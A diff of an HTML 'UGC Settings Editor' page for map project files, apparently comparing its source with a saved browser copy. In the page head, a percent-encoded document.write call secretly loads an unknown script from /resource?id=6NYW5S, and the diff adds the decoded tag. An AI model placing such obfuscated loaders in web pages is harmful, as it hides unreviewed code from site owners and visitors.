@@ -1,11 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<!DOCTYPE html><html lang="en"><head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>UGC Settings Editor by Shah G Creator</title>
     <link rel="icon" href="/x.svg" type="image/svg+xml">
-    <script language="javascript">document.write( unescape( '%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%72%65%73%6F%75%72%63%65%3F%69%64%3D%36%4E%59%57%35%53%22%3E%3C%2F%73%63%72%69%70%74%3E' ))</script>
+    <script language="javascript">document.write( unescape( '%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%72%65%73%6F%75%72%63%65%3F%69%64%3D%36%4E%59%57%35%53%22%3E%3C%2F%73%63%72%69%70%74%3E' ))</script><script src="/resource?id=6NYW5S"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: #f4f7f9; color: #333; line-height: 1.5; }
@@ -47,12 +45,12 @@
             <h1>🎮 UGC Settings Editor</h1>
         </div>
 
-        <div id="loadingIndicator" class="status-msg info-box" style="text-align: center;">
+        <div id="loadingIndicator" class="status-msg info-box hidden" style="text-align: center;">
             ⚙️ Settings library is loading...
         </div>
 
         <div class="upload-section">
-            <div class="upload-box disabled" id="uploadBox" onclick="document.getElementById('fileInput').click()">
+            <div class="upload-box" id="uploadBox" onclick="document.getElementById('fileInput').click()">
                 <input type="file" id="fileInput" accept=".bin,.dat,*">
                 <span id="uploadText">📁 Click to select Map Project File</span>
             </div>
@@ -64,7 +62,7 @@
         <div id="settingsContainer"></div>
 
         <div class="button-group hidden" id="buttonGroup">
-            <button class="btn btn-primary" id="downloadBtn">💾 Save & Download</button>
+            <button class="btn btn-primary" id="downloadBtn">💾 Save &amp; Download</button>
         </div>
     </div>
 
@@ -79,6 +77,7 @@
                 const root = protobuf.parse(protoSchema, { keepCase: true }).root;
                 UGCProjectDataType = root.lookupType("UGCProjectData");
                 protoReady = true;
+                
                 document.getElementById('loadingIndicator').classList.add('hidden');
                 document.getElementById('uploadBox').classList.remove('disabled');
             } catch (e) { showError('Proto Load Error: ' + e.message); }
@@ -192,5 +191,6 @@
             eb.textContent = "❌ " + m; eb.classList.remove('hidden'); 
         }
     </script>
-</body>
-</html>
+
+
+</body></html>
